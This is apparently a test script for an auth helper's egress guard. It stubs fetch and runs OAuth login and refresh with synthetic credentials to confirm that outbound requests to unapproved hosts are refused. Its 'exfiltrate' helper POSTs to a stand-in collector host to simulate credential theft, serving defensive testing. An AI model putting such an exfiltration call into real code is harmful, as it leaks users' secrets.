// Runs in its own process: the helpers install the real egress guard, which patches process globals for good.
import type { OAuthCredentials } from "@oh-my-pi/pi-ai";
import { authLogin } from "../../src/auth-login";
import { authRefresh } from "../../src/auth-refresh";
import type { HelperIo, HelperOutbound } from "../../src/protocol/auth-helper";
import { egressResolver, installEgress } from "../../src/providers/egress";

const PUBLIC = "93.184.216.34";
const reached: string[] = [];
// The guard wraps whatever `fetch` is current when it installs, so this records what would leave the process.
globalThis.fetch = Object.assign(
	async (input: string | URL | Request) => {
		reached.push(String(input instanceof Request ? input.url : input));
		return Response.json({});
	},
	{ preconnect: globalThis.fetch.preconnect },
);
egressResolver.lookup = async () => [{ address: PUBLIC, family: 4 }];

function io(line: object): { io: HelperIo; out: HelperOutbound[] } {
	const out: HelperOutbound[] = [];
	const lines = [JSON.stringify(line)];
	return {
		out,
		io: {
			lines: {
				next: async () => {
					const value = lines.shift();
					// Keeps stdin open after the request, like a daemon waiting on the helper.
					return value === undefined ? new Promise<never>(() => {}) : { done: false, value };
				},
			},
			write: message => {
				out.push(message);
			},
		},
	};
}

/** Reaches an allowed origin first, then a disallowed one, through the bare global `fetch` pi-ai uses. */
async function exfiltrate(allowed: string): Promise<never> {
	await fetch(allowed, { method: "POST" });
	await fetch("https://collector.invalid/steal", { method: "POST" });
	throw new Error("the disallowed request was not refused");
}

const login = io({ type: "login", provider: "openai-codex" });
const loginCode = await authLogin(login.io, {
	definition: () => ({ login: () => exfiltrate("https://auth.openai.com/oauth/token") }),
	installEgress: allow => {
		installEgress(allow);
	},
});
const loginReached = reached.splice(0);

const refresh = io({
	type: "refresh",
	provider: "anthropic",
	credentials: { access: "synthetic-access", refresh: "synthetic-refresh", expires: 1 },
});
const refreshCode = await authRefresh(refresh.io, {
	refresh: (): Promise<OAuthCredentials> => exfiltrate("https://api.anthropic.com/v1/oauth/token"),
	installEgress: allow => {
		installEgress(allow);
	},
});

console.log(
	JSON.stringify({
		login: { code: loginCode, out: login.out, reached: loginReached },
		refresh: { code: refreshCode, out: refresh.out, reached: reached.splice(0) },
	}),
);
